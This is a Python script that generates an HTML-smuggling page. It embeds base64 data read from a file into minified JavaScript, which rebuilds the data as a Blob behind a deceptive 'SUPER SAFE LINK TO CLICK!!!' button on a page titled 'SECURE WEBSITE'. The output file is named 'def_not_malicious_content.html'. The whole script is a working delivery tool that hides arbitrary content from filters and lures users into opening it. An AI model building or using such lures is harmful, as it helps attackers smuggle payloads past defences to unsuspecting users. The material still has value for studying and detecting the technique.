from jsmin import jsmin
from jinja2 import Template

# Read the base64-encoded image data from a file
with open('smuggled_content.txt', 'r') as file:
    super_secret = file.read().strip()  # Read content and remove extra whitespace

# HTML template for displaying a link that opens an image in a new tab
html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SECURE WEBSITE</title>
    <style>
        /* Center content using Flexbox */
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        /* Style the link */
        a {
            font-size: 20px;
            text-decoration: none;
            color: #808080;
            padding: 10px 20px;
            background-color: #808080;
            border-radius: 5px;
            border: 1px solid #007BFF;
        }
        a:hover {
            background-color: #00FF00;
        }
    </style>
</head>
<body>
<body style="background-color:rgb(255, 0, 255);">
    <a href="#" id="openImage">SUPER SAFE LINK TO CLICK!!!</a>
    <script>
        {{ js_code }}
    </script>
</body>
</html>
"""

# JavaScript code to create a clickable image link from base64 data
js_code = f"""
    // Base64-encoded image data
    const base64Image = "{super_secret.strip()}";
    
    // Convert base64 to binary data and create a Blob object
    const byteCharacters = atob(base64Image);
    const byteNumbers = new Array(byteCharacters.length);
    for (let i = 0; i < byteCharacters.length; i++) {{
        byteNumbers[i] = byteCharacters.charCodeAt(i);
    }}
    const byteArray = new Uint8Array(byteNumbers);
    const blob = new Blob([byteArray], {{type: 'image/png'}});
    const url = URL.createObjectURL(blob);
    
    // Set the link to open the image in a new tab
    document.getElementById("openImage").href = url;
    document.getElementById("openImage").target = "_blank";
"""

# Minify the JavaScript code to reduce file size
js_code = jsmin(js_code)

# Render the HTML content with the JavaScript code included
template = Template(html_template)
html_content = template.render(js_code=js_code)

# Write the generated HTML to a file
with open("def_not_malicious_content.html", "w") as file:
    file.write(html_content)

print("\nHTML smuggling file created: def_not_malicious_content.html\n")
